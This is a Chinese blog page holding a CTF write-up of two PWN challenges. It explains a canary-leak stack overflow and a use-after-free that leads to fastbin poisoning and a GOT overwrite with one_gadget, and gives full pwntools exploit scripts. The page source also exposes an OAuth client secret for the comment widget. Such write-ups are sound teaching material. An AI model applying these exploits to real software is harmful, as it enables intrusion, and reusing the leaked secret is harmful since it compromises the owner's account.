@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 3.8.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>[PWN]2020铁三第四赛区个人赛writeup - P1ay2win&#39;s blog</title>
+<meta name="twitter:card" content="summary_large_image">
+<meta property="og:site_name" content="P1ay2win's blog">
+<meta property="og:type" content="website">
+<meta property="og:title" content="[PWN]2020铁三第四赛区个人赛writeup | P1ay2win's blog">
+<meta property="og:image" content="https://blog.play2win.top/2020/11/09/2020铁三第四赛区个人赛writeup/">
+<meta property="twitter:image" content="https://blog.play2win.top/2020/11/09/2020铁三第四赛区个人赛writeup/">
+
+
+
+
+
+
+<link rel="alternative" href="/atom.xml" title="[PWN]2020铁三第四赛区个人赛writeup" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/images/header.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+    
+    
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/header.png" alt="[PWN]2020铁三第四赛区个人赛writeup" height="28">
+                P1ay2win&#39;s blog
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">主页</a>
+                
+                <a class="navbar-item"
+                href="/archives">归档</a>
+                
+                <a class="navbar-item"
+                href="/categories">分类</a>
+                
+                <a class="navbar-item"
+                href="/tags">标签</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main">
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2020-11-09T05:38:27.000Z">2020-11-09</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/PWN/">PWN</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    6 分钟 读完 (大约 829 个字)
+                </span>
+                
+                
+                    <i class="fa fa-eye"></i> <span id="busuanzi_value_page_pv"></span>次阅读
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                [PWN]2020铁三第四赛区个人赛writeup
+            
+        </h1>
+        <div class="content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>只有两道题都不难，但是最近没怎么做题，生疏了，做了好久才出来，留下没技术的泪水。还好队友给力，带我躺进了决赛。</p>
+<a id="more"></a>
+<p>顺便附上题目文件链接：</p>
+<p><a href="./namepie.zip">namepie.zip</a></p>
+<p><a href="./onetime.zip">onetime.zip</a></p>
+<h2 id="namepie"><a href="#namepie" class="headerlink" title="namepie"></a>namepie</h2><p>IDA打开直接看伪代码，漏洞在函数<code>sub_9A0</code>，栈溢出，但事实上没这么简单。</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">ssize_t</span> sub_9A0()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x1E</span>uLL);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input your Name:"</span>);</span><br><span class="line">  read(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x30</span>uLL);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"hello %s: and what do your want to sey!\n"</span>, &amp;s);</span><br><span class="line">  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x60</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>拉到linux上checksec查了下，保护全开，要成功栈溢出首先得绕过canary。</p>
+<p><img src="/2020/11/09/2020铁三第四赛区个人赛writeup/屏幕截图 2020-11-08 221544.png" alt></p>
+<p>canary最后一个字节为<code>00</code>，所以直接写入<code>0x29</code>个字符，覆盖掉<code>00</code>，利用<code>printf</code>就能读出canary。</p>
+<p>程序里还有个<code>system(&#39;/bin/sh&#39;)</code>的backdoor，跟栈溢出的返回地址刚好就差一个字节，所以随机地址也没什么影响。</p>
+<p>最后padding带上canary，还有就是读到的canary记得减去覆盖<code>00</code>的那个字节就行了。</p>
+<p><img src="/2020/11/09/2020铁三第四赛区个人赛writeup/屏幕截图 2020-11-08 221637.png" alt></p>
+<p>exp：</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="hljs-string">'DEBUG'</span></span><br><span class="line">context.binary = <span class="hljs-string">'./namepie'</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">'l'</span>:</span><br><span class="line">    p = process([<span class="hljs-string">'./namepie'</span>])</span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    p = remote(<span class="hljs-string">'172.20.14.91'</span>,<span class="hljs-number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># gdb.attach(p)</span></span><br><span class="line">p.sendafter(<span class="hljs-string">'Input your Name:'</span>,cyclic(<span class="hljs-number">0x29</span>))</span><br><span class="line">p.recvuntil(<span class="hljs-string">'iaaajaaa'</span>)</span><br><span class="line">canary = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-number">-0x6b</span></span><br><span class="line">print(hex(canary))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="hljs-string">'and what do your want to sey!\n'</span>,flat(cyclic(<span class="hljs-number">0x28</span>),canary,<span class="hljs-number">0xdeadbeef</span>)+<span class="hljs-string">'\x71'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="onetime"><a href="#onetime" class="headerlink" title="onetime"></a>onetime</h2><p>UAF的题，有增删改查的功能，还有一个选项能添加堆块并写入内容，但都只能用一次。</p>
+<p>UAF就处在del功能里，free掉堆块后没将指针置空。</p>
+<figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">cmd_del</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">free</span>(buf);                                    <span class="hljs-comment">// uaf</span></span><br><span class="line">  result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">"complete!"</span>);</span><br><span class="line">  add_flag = <span class="hljs-number">0</span>;</span><br><span class="line">  del_flag = <span class="hljs-number">1</span>;</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于添加的堆块的大小都为<code>0x60</code>，所以删掉一个堆块得到<code>fastbin</code>，再利用UAF修改<code>fastbin</code>的<code>fd</code>，连续添加两个堆块就能实现任意地址写。</p>
+<p>checksec查了下，没开随机地址，bss上刚好有个<code>0x7f</code>，所以fake chunk就能开bss上了。标记功能使用次数的flag也在bss上，把flag改为大于1，就能绕过了使用次数的限制。</p>
+<p><img src="/2020/11/09/2020铁三第四赛区个人赛writeup/屏幕截图 2020-11-08 215334.png" alt></p>
+<p><img src="/2020/11/09/2020铁三第四赛区个人赛writeup/屏幕截图 2020-11-08 215937.png" alt></p>
+<p>然后改buf的指针到got表，利用读功能得到libc的基址，再然后改got表为one_gadget的方式getshell。</p>
+<p>改了后的bss：</p>
+<p><img src="/2020/11/09/2020铁三第四赛区个人赛writeup/屏幕截图 2020-11-08 220349.png" alt></p>
+<p>测试下来，改<code>read</code>的got，one_gadget能正常使用。</p>
+<p><img src="/2020/11/09/2020铁三第四赛区个人赛writeup/屏幕截图 2020-11-08 221049.png" alt></p>
+<p>exp:</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="hljs-string">'DEBUG'</span></span><br><span class="line">context.binary = <span class="hljs-string">'./onetime'</span></span><br><span class="line">elf = ELF(<span class="hljs-string">'./onetime'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">'l'</span>:</span><br><span class="line">    p = process(<span class="hljs-string">'./onetime'</span>)</span><br><span class="line">    libc = context.binary.libc</span><br><span class="line">    print(libc)</span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    p = remote(<span class="hljs-string">'172.20.14.91'</span>,<span class="hljs-number">10001</span>)</span><br><span class="line">    libc = ELF(<span class="hljs-string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd_add</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'your choice &gt;&gt;'</span>,<span class="hljs-string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd_edit</span><span class="hljs-params">(content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'your choice &gt;&gt;'</span>,<span class="hljs-string">'2'</span>)</span><br><span class="line">    p.sendafter(<span class="hljs-string">'fill content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd_show</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'your choice &gt;&gt;'</span>,<span class="hljs-string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="hljs-string">'data:'</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd_del</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'your choice &gt;&gt;'</span>,<span class="hljs-string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd_add_name</span><span class="hljs-params">(content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'your choice &gt;&gt;'</span>,<span class="hljs-string">'5'</span>)</span><br><span class="line">    p.sendafter(<span class="hljs-string">'Hero! Leave your name:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># gdb.attach(p,'b *0x4009be')</span></span><br><span class="line">fake_chunk = <span class="hljs-number">0x602090</span> - <span class="hljs-number">0x3</span></span><br><span class="line">read_got = elf.got[<span class="hljs-string">'read'</span>]</span><br><span class="line"><span class="hljs-comment"># print(read_got)</span></span><br><span class="line"></span><br><span class="line">cmd_add()</span><br><span class="line">cmd_del()</span><br><span class="line">cmd_edit(flat(fake_chunk))</span><br><span class="line">cmd_add()</span><br><span class="line">cmd_add_name(<span class="hljs-string">'\x00'</span>*<span class="hljs-number">3</span>+flat(cyclic(<span class="hljs-number">0x8</span>),read_got,cyclic(<span class="hljs-number">0x10</span>)))</span><br><span class="line">read_got = u64(cmd_show()[:<span class="hljs-number">-1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))</span><br><span class="line">libc.address = read_got - libc.sym[<span class="hljs-string">'read'</span>]</span><br><span class="line">print(hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># one_gadget = [0x45226,0x4527a,0xf0364,0xf1207]</span></span><br><span class="line">one_gadget = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]</span><br><span class="line">cmd_edit(flat(libc.address+one_gadget[<span class="hljs-number">0</span>]))</span><br><span class="line"><span class="hljs-comment"># cmd_del()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+        </div>
+        
+            <ul class="post-copyright">
+            <li><strong>本文标题：</strong><a href="https://blog.play2win.top/2020/11/09/2020铁三第四赛区个人赛writeup/">[PWN]2020铁三第四赛区个人赛writeup</a></li>
+            <li><strong>本文作者：</strong><a href="https://blog.play2win.top">P1ay2win</a></li>
+            <li><strong>本文链接：</strong><a href="https://blog.play2win.top/2020/11/09/2020铁三第四赛区个人赛writeup/">https://blog.play2win.top/2020/11/09/2020铁三第四赛区个人赛writeup/</a></li>
+            <li><strong>发布时间：</strong>2020-11-09</li>
+            <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+            </li>
+            </ul>
+        
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/StackOverflow/">StackOverflow</a>, <a class="has-link-grey -link" href="/tags/UAF/">UAF</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">基于ASP.NET MVC的easycms的easy代码审计</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2020/10/20/[域渗透]Vulnstack2_walkthrough/">
+                <span class="level-item">[域渗透]Vulnstack2_walkthrough</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">评论</h3>
+        
+<div id="comment-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '372fb49f2243341bf93b',
+        clientSecret: 'b79da9cd60cecc3af662428f1daa6e01b1702d75',
+        id: 'c6284c42894c7aa1ea2689d7bb6cc8d6',
+        repo: 'p1ay2win.github.io',
+        owner: 'p1ay2win',
+        admin: "p1ay2win",
+        createIssueManually: false,
+        distractionFreeMode: false
+    })
+    gitalk.render('comment-container')
+</script>
+
+
+    </div>
+</div>
+
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
+                        <img class="is-rounded" src="/images/header.png" alt="p1ay2win">
+                    </figure>
+                    
+                    <p class="is-size-4 is-block">
+                        p1ay2win
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        他们的爱与风华，只问自由，只问盛放，只问深情，只问初心，只问勇敢，无问西东。
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>CN</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        35
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        7
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        31
+                    </p>
+                </div>
+            </div>
+        </nav>
+        
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://p1ay2win.github.io" target="_blank">
+                关注我</a>
+        </div>
+        
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/P1ay2win/">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Twitter" href="https://twitter.com/p1ay2win">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+
+    
+        
+
+    <div class="card widget column-left is-sticky" id="toc">
+        <div class="card-content">
+            <div class="menu">
+                <h3 class="menu-label">
+                    目录
+                </h3>
+                <ul class="menu-list"><li>
+        <a class="is-flex" href="#前言">
+        <span class="has-mr-6">1</span>
+        <span>前言</span>
+        </a></li><li>
+        <a class="is-flex" href="#namepie">
+        <span class="has-mr-6">2</span>
+        <span>namepie</span>
+        </a></li><li>
+        <a class="is-flex" href="#onetime">
+        <span class="has-mr-6">3</span>
+        <span>onetime</span>
+        </a></li></ul>
+            </div>
+        </div>
+    </div>
+
+
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen ">
+        
+        </div>
+    
+</div>
+
+
+                
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    P1ay2win&#39;s blog
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2022 P1ay2win&nbsp;
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>访问量<span id="busuanzi_value_site_pv"></span>次  <i class="fa fa-user-md"></i>  访客数<span id="busuanzi_value_site_uv"></span>人<br>
+                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://p1ay2win.github.io">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+<script>
+var IcarusThemeSettings = {
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    }
+};
+</script>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+    
+    
+<script src="/js/animation.js"></script>
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+<script src="/js/gallery.js" defer></script>
+
+    
+    
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+    
+    <script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+    
+    
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
